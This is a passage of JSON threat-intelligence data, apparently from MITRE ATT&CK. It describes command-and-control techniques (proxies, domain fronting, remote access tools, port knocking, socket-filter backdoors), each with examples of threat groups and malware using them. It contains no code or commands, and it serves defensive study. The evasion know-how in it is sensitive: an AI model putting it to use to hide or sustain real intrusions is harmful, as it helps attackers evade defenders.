can use a proxy during exfiltration if set in the configuration."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA has the ability to function as a SOCKS proxy."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb has the ability to use a HTTP proxy server for C&C communications."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used a reverse proxy tool similar to the GitHub repository revsocks."}, {"id": "S0108", "name": "netsh", "description": "netsh can be used to set up a proxy tunnel to allow remote host access to an infected host."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can implement use of proxies to pivot traffic."}, {"id": "S0508", "name": "ngrok", "description": "ngrok can be used to proxy connections to machines located behind NAT or firewalls."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "For Operation Sharpshooter, the threat actors used the ExpressVPN service to hide their location."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to proxy network communications."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used the AirVPN service for operational activity."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains modules that allow for use of proxies in command and control."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can communicate over a reverse proxy using SOCKS5."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality."}, {"id": "S0332", "name": "Remcos", "description": "Remcos uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying."}, {"id": "S1099", "name": "Samurai", "description": "Samurai has the ability to proxy connections to specified remote IPs and ports through a a proxy module."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot can start SOCKS proxy threads."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to use an embedded SOCKS proxy in C2 communications."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to proxy communications with command and control (C2) servers."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors have included local UPnP RPC proxies."}, {"id": "S0263", "name": "TYPEFRAME", "description": "A TYPEFRAME variant can force the compromised system to function as a proxy server."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used a peer-to-peer (P2P) network for C2."}, {"id": "S0207", "name": "Vasport", "description": "Vasport is capable of tunneling though a proxy."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised devices and customized versions of open source tools  such as FRP (Fast Reverse Proxy), Earthworm, and Impacket to proxy network traffic."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the capability to act as a reverse proxy."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure."}, {"id": "S0117", "name": "XTunnel", "description": "XTunnel relays traffic between a C2 server and a victim."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can create a proxy server on compromised hosts."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can set up an HTTP or SOCKS proxy."}], "sub_techniques": [{"name": "Internal Proxy", "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.", "detailed_description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.", "id": "T1090.001", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts."}, {"id": "S0031", "name": "BACKSPACE", "description": "The \"ZJ\" variant of BACKSPACE allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK used a proxy server between victims and the C2 server."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network."}, {"id": "S0038", "name": "Duqu", "description": "Duqu can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can used pipes to connect machines with restricted internet access to remote machines via other infected hosts."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized a proxy tool to communicate between compromised assets."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa discovered system proxy settings and used them if available."}, {"id": "S0009", "name": "Hikit", "description": "Hikit supports peer connections."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can function as a proxy to create a server that relays communication between the client and C&C server, or between two clients."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar has used internal nodes on the compromised network for C2 communications."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can create a named pipe to listen for and send data to a named pipe-based C2 server."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can create a named pipe to listen for and send data to a named pipe-based C2 server."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines."}, {"id": "S0699", "name": "Mythic", "description": "Mythic can leverage a peer-to-peer C2 profile between agents."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can proxy C2 communications including to and from internal agents without internet connectivity."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors proxied traffic through multiple infected systems."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB."}, {"id": "G0041", "name": "Strider", "description": "Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet installs an RPC server for P2P communications."}, {"id": "G0010", "name": "Turla", "description": "Turla has compromised internal network systems to act as a proxy to forward traffic to C2."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used the built-in netsh port proxy command to create proxies on compromised systems to facilitate access."}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows HTTP/S C2 mode can make use of a local proxy."}]}, {"name": "External Proxy", "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.", "detailed_description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.", "id": "T1090.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server."}, {"id": "G0016", "name": "APT29", "description": "APT29 uses compromised residential endpoints as proxies for defense evasion and network access."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader establishes SOCKS5 connections for its initial C2."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used various tools to proxy C2 communications."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used a modified version of HTRAN to redirect connections between networks."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole InvisiMole can identify proxy servers used by the victim and use them for C2 communication."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used multiple proxies to obfuscate network traffic from victims."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2)."}, {"id": "S0699", "name": "Mythic", "description": "Mythic can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has connected to C2 servers through proxies."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has a module that can proxy C2 communications."}, {"id": "S1084", "name": "QUIETEXIT", "description": "QUIETEXIT can proxy traffic via SOCKS."}, {"id": "S0019", "name": "Regin", "description": "Regin leveraged several compromised universities as proxies to obscure its origin."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can use pre-configured HTTP proxies."}, {"id": "G0091", "name": "Silence", "description": "Silence has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has routed their traffic through an external server in order to obfuscate their location."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has been known to reach a command and control server via one of nine proxy IP addresses.  "}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows HTTP/S C2 mode can make use of an external proxy."}]}, {"name": "Multi-hop Proxy", "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.", "detailed_description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available Tor network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network. Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.", "id": "T1090.003", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has routed traffic over Tor and VPN servers to obfuscate their activities."}, {"id": "G0016", "name": "APT29", "description": "A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR."}, {"id": "S0438", "name": "Attor", "description": "Attor has used Tor for C2 communication."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors used a layer of proxies to manage C2 communications."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has used Tor nodes for C2 traffic."}, {"id": "S0281", "name": "Dok", "description": "Dok downloads and installs Tor via homebrew."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can use multiple layers of proxy servers to hide terminal nodes in its infrastructure."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has configured multi-hop proxies via ProxyChains within victim environments."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used Tor to log in to victims' email accounts."}, {"id": "S1144", "name": "FRP", "description": "The FRP client can be configured to connect to the server through a proxy."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has used Tor relays for Command and Control servers."}, {"id": "G0100", "name": "Inception", "description": "Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer used Tor nodes for C2."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap uses a copy of tor2web proxy for HTTPS communications."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can chain together multiple compromised machines as proxies to reach their final targets."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used multi-hop proxies to disguise the source of their malicious traffic."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy uses Tor for command and control."}, {"id": "S1106", "name": "NGLite", "description": "NGLite has abused NKN infrastructure for its C2 communication."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has the ability to use a proxy chain with up to 255 hops when using TCP."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse has abused the NKN public blockchain protocol for its C2 communications."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors executed commands through the installed web shell via Tor exit nodes."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape uses Tor to communicate with C2."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure."}, {"id": "S0183", "name": "Tor", "description": "Traffic traversing the Tor network will be forwarded to multiple nodes before exiting the Tor network and continuing on to its intended destination."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use implants on multiple compromised machines to proxy communications through its worldwide P2P network."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Tor for C2."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used multi-hop proxies for command-and-control infrastructure."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses Tor for command and control traffic."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has utilized an ORB (operational relay box) network \u2013 consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) \u2013 to proxy traffic."}]}, {"name": "Domain Fronting", "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).", "detailed_description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.", "id": "T1090.004", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to accept a value for HTTP Host Header to enable domain fronting."}, {"id": "S0175", "name": "meek", "description": "meek uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports domain fronting via custom request headers."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used a fronted domain to obfuscate its hard-coded C2 server domain."}]}]}, {"name": "Remote Access Software", "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.", "detailed_description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).", "id": "T1219", "examples": [{"id": "G1024", "name": "Akira", "description": "Akira uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used AnyDesk to transfer tools between systems."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak has a plugin for VNC and Ammyy Admin Tool."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used DameWare Mini Remote Control for lateral movement."}, {"id": "S0384", "name": "Dridex", "description": "Dridex contains a module for VNC."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has checked for the LogMein event log in an attempt to encrypt files in remote machines."}, {"id": "G0120", "name": "Evilnum", "description": "EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has utilized the remote management tool Atera to download malware to a compromised system."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has established tmate sessions for C2 communications."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used AnyDesk and PuTTY on compromised systems."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a modified TeamViewer client as a command and control channel."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has installed TeamViewer on targeted systems."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels."}, {"id": "S0148", "name": "RTM", "description": "RTM has the capability to download a VNC module from command and control (C2)."}, {"id": "G0048", "name": "RTM", "description": "RTM has used a modified version of TeamViewer and Remote Utilities for remote access."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has established tmate sessions for C2 communications."}, {"id": "G0076", "name": "Thrip", "description": "Thrip used a cloud-based remote access software called LogMeIn for their attacks."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses vncDll module to remote control the victim machine."}], "sub_techniques": []}, {"name": "Traffic Signaling", "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.", "id": "T1205", "examples": [{"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can modify the DSUserAgentCap.pm Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests."}, {"id": "S0220", "name": "Chaos", "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the /tmp/clientsDownload.sock socket."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command."}, {"id": "S0587", "name": "Penquin", "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can identify a specific string in intercepted network traffic, SSH-2.0-OpenSSH_0.3xx., to trigger its command functionality."}], "sub_techniques": [{"name": "Port Knocking", "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.", "id": "T1205.001", "examples": [{"id": "S1060", "name": "Mafalda", "description": "Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports."}]}, {"name": "Socket Filters", "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.", "detailed_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\nFilters can be installed on any Unix-like platform with libpcap installed or on Windows hosts using Winpcap.  Adversaries may use either libpcap with pcap_setfilter or the standard library function setsockopt with SO_ATTACH_FILTER options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.", "id": "T1205.002", "examples": [{"id": "S1161", "name": "BPFDoor", "description": "BPFDoor uses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). When BPFDoor  finds a packet containing its \"magic\" bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields."}, {"id": "S0587", "name": "Penquin", "description": "Penquin installs a TCP and UDP filter on the eth0 interface."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at /data/runtime/cockpit/wd.fd for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS."}]}]}, {"name": "Web Service", "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "detailed_description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a 